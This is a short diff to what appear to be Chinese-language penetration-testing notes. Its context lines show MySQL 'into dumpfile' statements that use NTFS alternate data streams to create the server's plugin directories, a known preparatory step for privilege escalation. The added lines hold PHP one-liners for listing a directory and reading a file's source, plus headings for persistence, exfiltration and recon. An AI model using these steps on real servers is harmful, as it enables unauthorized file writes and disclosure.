@@ -217,3 +217,14 @@ select 'It is dll' into dumpfile 'C:\\Program Files\\MySQL\\MySQL Server 5.1\\li
 //利用NTFS ADS创建lib目录
 select 'It is dll' into dumpfile 'C:\\Program Files\\MySQL\\MySQL Server 5.1\\lib\\plugin::$INDEX_ALLOCATION';
 //利用NTFS ADS创建plugin目录
+
+
+php:列举及读取目录
+foreach (glob("./*") as $filename) {  echo $filename."<br>"; }
+highlight_file('test.php');
+
+
+
+权限维持（Persistence）
+信息收集（Exfiltration）
+信息侦察（Recon）
